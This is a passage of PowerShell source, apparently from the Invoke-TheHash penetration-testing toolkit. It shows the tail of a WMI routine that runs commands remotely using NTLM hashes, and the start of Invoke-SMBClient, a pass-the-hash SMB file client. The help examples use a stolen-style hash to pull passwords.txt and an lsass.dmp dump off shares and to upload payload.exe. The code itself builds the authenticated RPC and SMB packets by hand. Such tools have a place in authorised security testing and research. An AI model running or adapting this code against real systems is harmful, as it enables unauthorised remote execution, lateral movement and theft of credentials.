                                                0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x04,
                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0x03,0x00,0x00,0x00,0x2a,0x00,0x00,0x00,
                                                0x15,0x01,0x00,0x00,0x73,0x01,0x00,0x00,0x76,0x02,0x00,0x00,0xd4,
                                                0x02,0x00,0x00,0xb1,0x03,0x00,0x00,0x15,0xff,0xff,0xff,0xff,0xff,
                                                0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x12,0x04,0x00,0x80,0x00,0x5f,
                                                0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,0x52,0x53,0x00,0x00,
                                                0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,0x69,0x6e,0x65,
                                                0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,
                                                0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,
                                                0x00,0x00,0x49,0x6e,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x5e,0x00,0x00,
                                                0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0x94,
                                                0x00,0x00,0x00,0x00,0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,
                                                0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,
                                                0x68,0x72,0x65,0x61,0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,
                                                0x6e,0x73,0x7c,0x6c,0x70,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,
                                                0x69,0x6e,0x65,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,
                                                0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
                                                0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,
                                                0x5e,0x00,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0xca,0x00,
                                                0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x8c,0x00,0x00,0x00,0x00,0x49,
                                                0x44,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,
                                                0x00,0x00,0x00,0x59,0x01,0x00,0x00,0x5e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0xca,0x00,0x00,0x00,0x02,0x08,0x20,0x00,
                                                0x00,0x8c,0x00,0x00,0x00,0x11,0x01,0x00,0x00,0x11,0x03,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,
                                                0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x04,0x00,0x00,0x00,0x00,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,
                                                0x44,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x00,0x00,0x73,0x74,
                                                0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,0x00,0x00,0x00,0x49,0x6e,
                                                0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,
                                                0x00,0x00,0x85,0x01,0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,
                                                0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0xe2,0x01,0x00,0x00,0x00,
                                                0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,0x50,0x72,0x6f,0x63,
                                                0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,0x68,0x72,0x65,0x61,
                                                0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x73,0x7c,0x43,
                                                0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x7c,
                                                0x6c,0x70,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x44,0x69,0x72,0x65,
                                                0x63,0x74,0x6f,0x72,0x79,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,
                                                0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,
                                                0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,
                                                0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,
                                                0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,
                                                0x2b,0x02,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0xda,0x01,0x00,0x00,
                                                0x00,0x49,0x44,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,
                                                0x03,0x08,0x00,0x00,0x00,0xba,0x02,0x00,0x00,0xac,0x01,0x00,0x00,
                                                0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x2b,0x02,0x00,0x00,0x02,0x08,
                                                0x20,0x00,0x00,0xda,0x01,0x00,0x00,0x72,0x02,0x00,0x00,0x11,0x03,
                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,
                                                0x67,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x49,0x6e,0x66,0x6f,
                                                0x72,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x00,0x00,0x6f,0x62,0x6a,0x65,
                                                0x63,0x74,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,
                                                0x08,0x00,0x00,0x00,0xef,0x02,0x00,0x00,0x00,0x49,0x6e,0x00,0x0d,
                                                0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,
                                                0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,
                                                0xff,0xff,0x01,0x00,0x00,0x00,0x4c,0x03,0x00,0x00,0x00,0x57,0x4d,
                                                0x49,0x7c,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x00,0x00,0x4d,0x61,
                                                0x70,0x70,0x69,0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,
                                                0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x29,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,
                                                0x00,0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,
                                                0x00,0xff,0xff,0x66,0x03,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x44,
                                                0x03,0x00,0x00,0x00,0x49,0x44,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,
                                                0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,
                                                0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0xf5,0x03,0x00,0x00,0x16,
                                                0x03,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x66,0x03,0x00,
                                                0x00,0x02,0x08,0x20,0x00,0x00,0x44,0x03,0x00,0x00,0xad,0x03,0x00,
                                                0x00,0x11,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x6f,0x62,
                                                0x6a,0x65,0x63,0x74,0x3a,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,
                                                0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70 +
                                                (,0x00 * 501) +
                                                $command_length +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x0e,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01 +
                                                $command_length2 +
                                                0x00,0x80,0x00,0x5f,0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,
                                                0x52,0x53,0x00,0x00 +
                                                $command_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00
                                
                                if($Stub_data.Length -lt $request_split_index)
                                {
                                    $request_flags = 0x83
                                    $WMI_client_stage_next = 'Result'
                                }
                                else
                                {
                                    $request_split = $true
                                    $request_split_stage_final = [Math]::Ceiling($stub_data.Length / $request_split_index)

                                    if($request_split_stage -lt 2)
                                    {
                                        $request_length = $stub_data.Length
                                        $stub_data = $stub_data[0..($request_split_index - 1)]
                                        $request_split_stage = 2
                                        $sequence_number_counter = 10
                                        $request_flags = 0x81
                                        $request_split_index_tracker = $request_split_index
                                        $WMI_client_stage_next = 'Request'
                                    }
                                    elseif($request_split_stage -eq $request_split_stage_final)
                                    {
                                        $request_split = $false
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $request_split_stage = 0
                                        $stub_data = $stub_data[$request_split_index_tracker..$stub_data.Length]
                                        $request_flags = 0x82
                                        $WMI_client_stage_next = 'Result'
                                    }
                                    else
                                    {
                                        $request_length = $stub_data.Length - $request_split_index_tracker
                                        $stub_data = $stub_data[$request_split_index_tracker..($request_split_index_tracker + $request_split_index - 1)]
                                        $request_split_index_tracker += $request_split_index
                                        $request_split_stage++
                                        $sequence_number = [System.BitConverter]::GetBytes($sequence_number_counter)
                                        $sequence_number_counter++
                                        $request_flags = 0x80
                                        $WMI_client_stage_next = 'Request'
                                    }

                                }

                            }

                        }

                        $packet_RPC = New-PacketRPCRequest $request_flags $stub_data.Length 16 $request_auth_padding $request_call_ID $request_context_ID $request_opnum $request_UUID

                        if($request_split)
                        {
                            $packet_RPC["AllocHint"] = [System.BitConverter]::GetBytes($request_length)
                        }

                        $packet_NTLMSSP_verifier = New-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier 
                        $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $stub_data + $NTLMSSP_verifier[0..($request_auth_padding + 7)])
                        $RPC_signature = $RPC_signature[0..7]
                        $packet_NTLMSSP_verifier["NTLMSSPVerifierChecksum"] = $RPC_signature
                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
                        $WMI_client_send = $RPC + $stub_data + $NTLMSSP_verifier
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()

                        if(!$request_split)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        }

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        $WMI_client_stage = $WMI_client_stage_next
                    }

                    'Result'
                    {

                        while($WMI_client_random_port_stream.DataAvailable)
                        {
                            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                            Start-Sleep -m $Sleep
                        }

                        if($WMI_client_receive[1145] -ne 9)
                        { 
                            $target_process_ID = Get-UInt16DataLength 1141 $WMI_client_receive
                            Write-Output "[+] Command executed with process ID $target_process_ID on $target_long"
                        }
                        else
                        {
                            Write-Output "[-] Process did not start, check your command"
                        }

                        $WMI_client_stage = 'Exit'
                    }

                }

                Start-Sleep -m $Sleep
            
            }

            $WMI_client_random_port.Close()
            $WMI_client_random_port_stream.Close()
        }

        $WMI_client.Close()
        $WMI_client_stream.Close()
    }

}

}





function Invoke-SMBClient
{
<#
.SYNOPSIS
Invoke-SMBClient performs basic file share tasks with pass the hash. This module supports SMB2 (2.1) only with and
without SMB signing. Note that this client is slow compared to the Windows client.

Author: Kevin Robertson (@kevin_robertson)  
License: BSD 3-Clause 

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.Parameter Action
Default = List: (List/Recurse/Delete/Get/Put) Action to perform. 
List: Lists the contents of a directory.
Recurse: Lists the contents of a directory and all subdirectories.
Delete: Deletes a file.
Get: Downloads a file.
Put: Uploads a file and sets the creation, access, and last write times to match the source file.

.PARAMETER Source
List and Recurse: UNC path to a directory.
Delete: UNC path to a file.
Get: UNC path to a file.
Put: File to upload. If a full path is not specified, the file must be in the current directory. When using the
'Modify' switch, 'Source' must be a byte array.

.PARAMETER Destination
List and Recurse: Not used.
Delete: Not used.
Get: If used, value will be the new filename of downloaded file. If a full path is not specified, the file will be
created in the current directory.
Put: UNC path for uploaded file. The filename must be specified.

.PARAMETER Modify
List and Recurse: The function will output an object consisting of directory contents.
Delete: Not used.
Get: The function will output a byte array of the downloaded file instead of writing the file to disk. It's
advisable to use this only with smaller files and to send the output to a variable.
Put: Uploads a byte array to a new destination file.

.PARAMETER NoProgress
List and Recurse: Not used.
Delete: Not used.
Get and Put: Prevents displaying of a progress bar.

.PARAMETER Sleep
Default = 100 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try increasing this
if downloaded files are being corrupted.

.PARAMETER Session
Inveigh-Relay authenticated session.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target. Note, only the signing check works with SMB1.

.EXAMPLE
List the contents of a root share directory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Source \\server\share -verbose

.EXAMPLE
Recursively list the contents of a share starting at the root.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share

.EXAMPLE
Recursively list the contents of a share subdirectory and return only the contents output to a variable.
$directory_contents = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share\subdirectory -Modify

.EXAMPLE
Delete a file on a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\payload.exe

.EXAMPLE
Delete a file in subdirectories within a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\subdirectory\subdirectory\payload.exe

.EXAMPLE
Download a file from a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt

.EXAMPLE
Download a file from within a share subdirectory and set a new filename.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\subdirectory\lsass.dmp -Destination server_lsass.dmp

.EXAMPLE
Download a file from a share to a byte array variable instead of disk.
[Byte[]]$password_file = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt -Modify
[System.Text.Encoding]::UTF8.GetString($password_file)

.EXAMPLE
Upload a file to a share subdirectory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source payload.exe -Destination \\server\share\subdirectory\payload.exe

.EXAMPLE
Upload a file to share from a byte array variable.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source $file_byte_array -Destination \\server\share\file.docx -Modify

.EXAMPLE
List the contents of a share directory using an authenticated Inveigh-Relay session.
Invoke-SMBClient -Session 1 -Source \\server\share

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][ValidateSet("List","Recurse","Get","Put","Delete")][String]$Action = "List",
    [parameter(Mandatory=$false)][String]$Destination,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$true)][Object]$Source,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$Modify,
    [parameter(Mandatory=$false)][Switch]$NoProgress,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=100
)

if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($ordered_dictionary)

    ForEach($field in $ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequest
{
    param([Byte[]]$FileName,[Int]$ExtraInfo,[Int64]$AllocationSize)

    if($FileName)
    {
        $file_name_length = [System.BitConverter]::GetBytes($FileName.Length)[0,1]
    }
    else
    {
        $FileName = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00
        $file_name_length = 0x00,0x00
    }

    if($ExtraInfo)
    {
